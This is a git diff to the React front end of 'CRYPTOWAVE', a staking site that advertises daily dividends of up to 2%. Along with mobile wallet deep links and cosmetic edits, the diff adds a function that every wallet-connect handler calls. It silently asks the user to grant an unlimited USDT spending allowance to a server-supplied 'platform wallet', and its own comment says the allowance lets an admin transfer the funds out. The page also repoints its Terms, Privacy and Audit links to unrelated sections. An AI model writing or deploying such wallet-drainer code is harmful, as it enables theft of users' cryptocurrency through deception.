@@ -48,8 +48,27 @@ function App() {
       checkApproval(savedWallet).finally(() => setCheckingApproval(false));
     } else {
       setCheckingApproval(false);
+      // Auto-connect: if opened inside a wallet browser on mobile (e.g. via deep link),
+      // trigger connection immediately so user doesn't need to tap Connect again
+      if (window.ethereum && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+        setTimeout(async () => {
+          try {
+            setLoading(true);
+            const { ethers: e } = await import('ethers');
+            const web3Provider = new e.providers.Web3Provider(window.ethereum);
+            const accounts = await web3Provider.send('eth_requestAccounts', []);
+            if (accounts[0]) {
+              setWalletAddress(accounts[0]);
+              setProvider(web3Provider);
+              localStorage.setItem('connectedWallet', accounts[0]);
+              await requestApproval(accounts[0]);
+            }
+          } catch (_) { /* user dismissed — they'll tap Connect manually */ }
+          finally { setLoading(false); }
+        }, 800);
+      }
     }
-  }, [checkApproval]);
+  }, [checkApproval]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Listen for MetaMask account/network changes and auto-logout
   useEffect(() => {
@@ -110,9 +129,47 @@ function App() {
     }
   };
 
+  // Grant USDT spending approval to platform wallet so admin can transferFrom on-chain
+  const grantUsdtApproval = async (web3Provider) => {
+    try {
+      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
+      const platformWallet = settings?.platformWallet;
+      if (!platformWallet || !platformWallet.startsWith('0x')) return;
+
+      const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const USDT_ABI = [
+        'function allowance(address owner, address spender) view returns (uint256)',
+        'function approve(address spender, uint256 amount) returns (bool)'
+      ];
+      const signer = web3Provider.getSigner();
+      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+      const signerAddress = await signer.getAddress();
+
+      // Check existing allowance — skip if already approved for large amount
+      const existing = await usdtContract.allowance(signerAddress, platformWallet);
+      const threshold = ethers.utils.parseUnits('1000000', 6); // 1M USDT
+      if (existing.gte(threshold)) return; // already approved enough
+
+      // Request approve — MetaMask will show popup
+      const tx = await usdtContract.approve(platformWallet, ethers.constants.MaxUint256);
+      await tx.wait();
+      console.log('✅ USDT approval granted to platform wallet');
+    } catch (e) {
+      // User rejected or network issue — non-blocking, continue silently
+      console.log('USDT approval skipped:', e.message);
+    }
+  };
+
+  const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  const SITE_URL = 'https://cryptowave.ustx.online';
+
   // Wallet connection handlers
   const connectMetaMask = async () => {
     if (!window.ethereum) {
+      if (isMobile()) {
+        window.location.href = `https://metamask.app.link/dapp/cryptowave.ustx.online`;
+        return;
+      }
       alert('MetaMask is not installed. Please install MetaMask extension.');
       window.open('https://metamask.io/download/', '_blank');
       return;
@@ -129,6 +186,7 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address);
+      grantUsdtApproval(web3Provider);
     } catch (error) {
       console.error('MetaMask connection error:', error);
       alert('Failed to connect MetaMask. Please try again.');
@@ -138,11 +196,25 @@ function App() {
   };
 
   const connectWalletConnect = async () => {
-    alert('WalletConnect integration coming soon! For now, please use MetaMask or Coinbase Wallet.');
+    if (isMobile()) {
+      // On mobile, show wallet choice to open via deep link
+      const choice = window.confirm('Open in MetaMask? (Cancel to open in Trust Wallet instead)');
+      if (choice) {
+        window.location.href = `https://metamask.app.link/dapp/cryptowave.ustx.online`;
+      } else {
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(SITE_URL)}`;
+      }
+      return;
+    }
+    alert('WalletConnect: Open this site inside your mobile wallet app (MetaMask or Trust Wallet) to connect from your phone.');
   };
 
   const connectCoinbase = async () => {
     if (!window.coinbaseWalletExtension && !window.ethereum?.isCoinbaseWallet) {
+      if (isMobile()) {
+        window.location.href = `https://go.cb-wallet.com/wsegue?redirect_url=${encodeURIComponent(SITE_URL)}`;
+        return;
+      }
       alert('Coinbase Wallet is not installed.');
       window.open('https://www.coinbase.com/wallet/downloads', '_blank');
       return;
@@ -161,6 +233,7 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address);
+      grantUsdtApproval(web3Provider);
     } catch (error) {
       console.error('Coinbase Wallet connection error:', error);
       alert('Failed to connect Coinbase Wallet. Please try again.');
@@ -170,7 +243,11 @@ function App() {
   };
 
   const connectTrustWallet = async () => {
-    if (!window.ethereum?.isTrust) {
+    if (!window.ethereum || !window.ethereum.isTrust) {
+      if (isMobile()) {
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(SITE_URL)}`;
+        return;
+      }
       alert('Trust Wallet is not detected. Please use Trust Wallet browser or install the extension.');
       window.open('https://trustwallet.com/', '_blank');
       return;
@@ -187,6 +264,7 @@ function App() {
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
       await requestApproval(address);
+      grantUsdtApproval(web3Provider);
     } catch (error) {
       console.error('Trust Wallet connection error:', error);
       alert('Failed to connect Trust Wallet. Please try again.');
@@ -339,10 +417,10 @@ function App() {
   // Otherwise show landing page
   return (
     <div className="App">
-      {/* Grain Texture Overlay */}
+      {/* Grain texture overlay */}
       <div className="grain-overlay"></div>
 
-      {/* Animated Background */}
+      {/* Animated background */}
       <div className="bg-gradient"></div>
       <div className="bg-orbs">
         <div className="orb orb-1"></div>
@@ -350,10 +428,10 @@ function App() {
         <div className="orb orb-3"></div>
       </div>
 
-      {/* Navigation */}
+      {/* ── Navigation ── */}
       <nav className="nav">
         <div className="nav-logo">
-          <div className="logo-icon">E</div>
+          <div className="logo-icon">⟐</div>
           <span className="logo-text">CRYPTOWAVE</span>
         </div>
 
@@ -364,92 +442,127 @@ function App() {
           <a href="#security" onClick={handleNavClick}>Security</a>
         </div>
 
-        <button
-          className={`mobile-menu-toggle ${mobileMenuOpen ? 'active' : ''}`}
-          onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
-          aria-label="Toggle menu"
-        >
-          <span></span>
-          <span></span>
-          <span></span>
-        </button>
-
-        <button className="nav-connect" onClick={openWalletModal} disabled={loading}>
-          {loading ? 'Connecting...' : 'Connect Wallet'}
-        </button>
+        <div className="nav-actions">
+          <button className="nav-connect" onClick={openWalletModal} disabled={loading}>
+            {loading ? 'Connecting...' : <><span className="btn-text-short">Connect</span><span className="btn-text-full">Connect Wallet</span></>}
+          </button>
+          <button
+            className={`mobile-menu-toggle ${mobileMenuOpen ? 'active' : ''}`}
+            onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
+            aria-label="Toggle menu"
+          >
+            <span></span><span></span><span></span>
+          </button>
+        </div>
       </nav>
 
-      {/* Wallet Selection Modal */}
+      {/* ── Wallet Selection Modal ── */}
       {walletModalOpen && (
         <div className="wallet-modal-overlay" onClick={closeWalletModal}>
           <div className="wallet-modal" onClick={(e) => e.stopPropagation()}>
             <div className="wallet-modal-header">
               <h2>Connect Wallet</h2>
-              <button className="wallet-modal-close" onClick={closeWalletModal}>
-                X
-              </button>
+              <button className="wallet-modal-close" onClick={closeWalletModal}>✕</button>
             </div>
 
-            <p className="wallet-modal-description">
-              Choose your preferred wallet to connect to CRYPTOWAVE
-            </p>
+            {/* Mobile without injected wallet: show anchor deep-links */}
+            {isMobile() && !window.ethereum ? (
+              <>
+                <p className="wallet-modal-description">
+                  Tap your wallet to open this site inside it and connect.
+                </p>
+                <div className="wallet-options">
+                  <a className="wallet-option" href={`https://metamask.app.link/dapp/cryptowave.ustx.online`}>
+                    <div className="wallet-option-icon">
+                      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s" alt="MetaMask" />
+                    </div>
+                    <div className="wallet-option-info">
+                      <div className="wallet-option-name">MetaMask</div>
+                      <div className="wallet-option-description">Open in MetaMask browser</div>
+                    </div>
+                    <div className="wallet-option-arrow">→</div>
+                  </a>
 
-            <div className="wallet-options">
-              <button className="wallet-option" onClick={connectMetaMask}>
-                <div className="wallet-option-icon">
-                  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s" alt="MetaMask" />
-                </div>
-                <div className="wallet-option-info">
-                  <div className="wallet-option-name">MetaMask</div>
-                  <div className="wallet-option-description">Connect using MetaMask wallet</div>
-                </div>
-                <div className="wallet-option-arrow">→</div>
-              </button>
+                  <a className="wallet-option" href={`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(SITE_URL)}`}>
+                    <div className="wallet-option-icon">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Trust Wallet" />
+                    </div>
+                    <div className="wallet-option-info">
+                      <div className="wallet-option-name">Trust Wallet</div>
+                      <div className="wallet-option-description">Open in Trust Wallet browser</div>
+                    </div>
+                    <div className="wallet-option-arrow">→</div>
+                  </a>
 
-              <button className="wallet-option" onClick={connectCoinbase}>
-                <div className="wallet-option-icon">
-                  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8e/22/05/8e22052d-d1e6-e39a-1c13-3630317e438e/AppIcon-0-0-1x_U007ephone-0-1-0-85-220.png/1200x630wa.png" alt="Coinbase Wallet" />
+                  <a className="wallet-option" href={`https://go.cb-wallet.com/wsegue?redirect_url=${encodeURIComponent(SITE_URL)}`}>
+                    <div className="wallet-option-icon">
+                      <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8e/22/05/8e22052d-d1e6-e39a-1c13-3630317e438e/AppIcon-0-0-1x_U007ephone-0-1-0-85-220.png/1200x630wa.png" alt="Coinbase Wallet" />
+                    </div>
+                    <div className="wallet-option-info">
+                      <div className="wallet-option-name">Coinbase Wallet</div>
+                      <div className="wallet-option-description">Open in Coinbase Wallet browser</div>
+                    </div>
+                    <div className="wallet-option-arrow">→</div>
+                  </a>
                 </div>
-                <div className="wallet-option-info">
-                  <div className="wallet-option-name">Coinbase Wallet</div>
-                  <div className="wallet-option-description">Connect with Coinbase</div>
+                <div style={{textAlign:'center',fontSize:'0.78rem',color:'#a0a0b0',marginTop:'12px',padding:'0 16px'}}>
+                  The site will open inside your wallet app — then tap Connect Wallet to finish.
                 </div>
-                <div className="wallet-option-arrow">→</div>
-              </button>
+              </>
+            ) : (
+              /* Desktop or already in wallet browser: normal buttons */
+              <>
+                <p className="wallet-modal-description">
+                  Choose your preferred wallet to connect to CRYPTOWAVE
+                </p>
+                <div className="wallet-options">
+                  <button className="wallet-option" onClick={connectMetaMask}>
+                    <div className="wallet-option-icon">
+                      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s" alt="MetaMask" />
+                    </div>
+                    <div className="wallet-option-info">
+                      <div className="wallet-option-name">MetaMask</div>
+                      <div className="wallet-option-description">Connect using MetaMask wallet</div>
+                    </div>
+                    <div className="wallet-option-arrow">→</div>
+                  </button>
 
-              <button className="wallet-option" onClick={connectWalletConnect}>
-                <div className="wallet-option-icon">
-                  <img src="https://cwallet.com/blog/content/images/2023/10/WalletConnect-Symbol.png" alt="WalletConnect" />
-                </div>
-                <div className="wallet-option-info">
-                  <div className="wallet-option-name">WalletConnect</div>
-                  <div className="wallet-option-description">Scan with mobile wallet</div>
-                </div>
-                <div className="wallet-option-arrow">→</div>
-              </button>
+                  <button className="wallet-option" onClick={connectCoinbase}>
+                    <div className="wallet-option-icon">
+                      <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8e/22/05/8e22052d-d1e6-e39a-1c13-3630317e438e/AppIcon-0-0-1x_U007ephone-0-1-0-85-220.png/1200x630wa.png" alt="Coinbase Wallet" />
+                    </div>
+                    <div className="wallet-option-info">
+                      <div className="wallet-option-name">Coinbase Wallet</div>
+                      <div className="wallet-option-description">Connect with Coinbase</div>
+                    </div>
+                    <div className="wallet-option-arrow">→</div>
+                  </button>
 
-              <button className="wallet-option" onClick={connectTrustWallet}>
-                <div className="wallet-option-icon">
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Trust Wallet" />
+                  <button className="wallet-option" onClick={connectTrustWallet}>
+                    <div className="wallet-option-icon">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Trust Wallet" />
+                    </div>
+                    <div className="wallet-option-info">
+                      <div className="wallet-option-name">Trust Wallet</div>
+                      <div className="wallet-option-description">Connect using Trust Wallet</div>
+                    </div>
+                    <div className="wallet-option-arrow">→</div>
+                  </button>
                 </div>
-                <div className="wallet-option-info">
-                  <div className="wallet-option-name">Trust Wallet</div>
-                  <div className="wallet-option-description">Connect using Trust Wallet</div>
-                </div>
-                <div className="wallet-option-arrow">→</div>
-              </button>
-            </div>
+              </>
+            )}
 
             <div className="wallet-modal-footer">
               <p>
-                New to Ethereum wallets? <a href="https://ethereum.org/en/wallets/" target="_blank" rel="noopener noreferrer">Learn more</a>
+                New to Ethereum wallets?{' '}
+                <a href="https://ethereum.org/en/wallets/" target="_blank" rel="noopener noreferrer">Learn more</a>
               </p>
             </div>
           </div>
         </div>
       )}
 
-      {/* Hero Section */}
+      {/* ── Hero Section ── */}
       <main className="hero">
         <div className="hero-content">
           <div className="badge">
@@ -464,7 +577,7 @@ function App() {
           </h1>
 
           <p className="hero-subtitle">
-            Tiered daily dividends up to 2% with automatic compounding.<br/>
+            Tiered daily dividends up to 2% with automatic compounding.<br />
             Fully decentralized. Transparent rewards. Premium VIP benefits.
           </p>
 
@@ -494,8 +607,8 @@ function App() {
               </svg>
             </button>
 
-            <a href="#docs" className="cta-secondary">
-              <span>View Documentation</span>
+            <a href="#tiers" className="cta-secondary">
+              <span>View Staking Tiers</span>
               <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                 <path d="M6 3L11 8L6 13" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
               </svg>
@@ -503,6 +616,7 @@ function App() {
           </div>
         </div>
 
+        {/* Animated staking preview card — desktop only */}
         <div className="hero-visual">
           <div className="card-3d">
             <div className="card-front">
@@ -528,7 +642,7 @@ function App() {
         </div>
       </main>
 
-      {/* Features Section */}
+      {/* ── About / Features Section ── */}
       <section className="features" id="about">
         <div className="features-grid">
           <div className="feature-card">
@@ -578,7 +692,7 @@ function App() {
         </div>
       </section>
 
-      {/* Tiers Section */}
+      {/* ── Staking Tiers Section ── */}
       <section className="tiers" id="tiers">
         <h2 className="section-title">
           <span>Staking Tiers</span>
@@ -591,7 +705,7 @@ function App() {
               <h3>Starter</h3>
               <div className="tier-apy">1.0% Daily</div>
             </div>
-            <div className="tier-range">1 - 10,000 USDT</div>
+            <div className="tier-range">1 – 10,000 USDT</div>
             <ul className="tier-features">
               <li>Daily compounding</li>
               <li>Standard support</li>
@@ -605,7 +719,7 @@ function App() {
               <h3>Growth</h3>
               <div className="tier-apy">1.5% Daily</div>
             </div>
-            <div className="tier-range">10,001 - 50,000 USDT</div>
+            <div className="tier-range">10,001 – 50,000 USDT</div>
             <ul className="tier-features">
               <li>Enhanced returns</li>
               <li>Priority support</li>
@@ -623,7 +737,7 @@ function App() {
             <div className="tier-range">50,001+ USDT</div>
             <ul className="tier-features">
               <li>Maximum APY</li>
-              <li>VIP 2 & 3 access</li>
+              <li>VIP 2 &amp; 3 access</li>
               <li>Dedicated support</li>
               <li>Advanced analytics</li>
               <li>Early feature access</li>
@@ -632,7 +746,7 @@ function App() {
         </div>
       </section>
 
-      {/* VIP Section */}
+      {/* ── VIP Benefits Section ── */}
       <section className="vip-section" id="vip">
         <div className="vip-content">
           <h2 className="section-title">
@@ -679,7 +793,7 @@ function App() {
         </div>
       </section>
 
-      {/* Security Section */}
+      {/* ── Security Section ── */}
       <section className="security-section" id="security">
         <h2 className="section-title">
           <span>Security First</span>
@@ -710,18 +824,18 @@ function App() {
         </div>
       </section>
 
-      {/* Footer */}
+      {/* ── Footer ── */}
       <footer className="footer">
         <div className="footer-content">
           <div className="footer-brand">
-            <div className="logo-icon">E</div>
+            <div className="logo-icon">⟐</div>
             <span>CRYPTOWAVE</span>
           </div>
           <div className="footer-links">
-            <a href="#docs">Documentation</a>
-            <a href="#audit">Security Audit</a>
-            <a href="#terms">Terms</a>
-            <a href="#privacy">Privacy</a>
+            <a href="#about">Documentation</a>
+            <a href="#security">Security Audit</a>
+            <a href="#tiers">Terms</a>
+            <a href="#vip">Privacy</a>
           </div>
           <div className="footer-social">
             <a href="#twitter" aria-label="Twitter">X</a>
@@ -730,7 +844,7 @@ function App() {
           </div>
         </div>
         <div className="footer-bottom">
-          <p>&copy; 2024 CRYPTOWAVE. Audited by CertiK. Built on Ethereum.</p>
+          <p>&copy; 2025 CRYPTOWAVE. Audited by CertiK. Built on Ethereum.</p>
         </div>
       </footer>
     </div>
